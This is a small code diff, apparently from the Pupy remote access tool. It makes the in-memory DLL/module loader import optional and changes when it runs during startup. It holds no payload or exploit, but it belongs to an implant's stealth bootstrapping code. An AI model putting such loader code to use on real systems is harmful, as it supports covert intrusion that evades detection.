@@ -790,10 +790,13 @@ def load_memimporter_fallback():
     global _load_dll
 
     if not is_supported(_import_module):
-        from .memimporter import load_dll, import_module
+        try:
+            from .memimporter import load_dll, import_module
 
-        _import_module = import_module
-        _load_dll = load_dll
+            _import_module = import_module
+            _load_dll = load_dll
+        except ImportError:
+            dprint('memimporter is not available')
 
 
 def setup_credentials(config):
@@ -841,11 +844,11 @@ def prepare(argv=sys.argv, debug=False, config={}, stdlib=None):
     from .dl_hacks import apply_dl_hacks
 
     register_pupyimporter()
-    load_memimporter_fallback()
 
     set_sighandlers()
     apply_ssl_hacks()
     apply_dl_hacks()
+    load_memimporter_fallback()
     setup_credentials(config)
     setup_manager()
     load_network_modules()
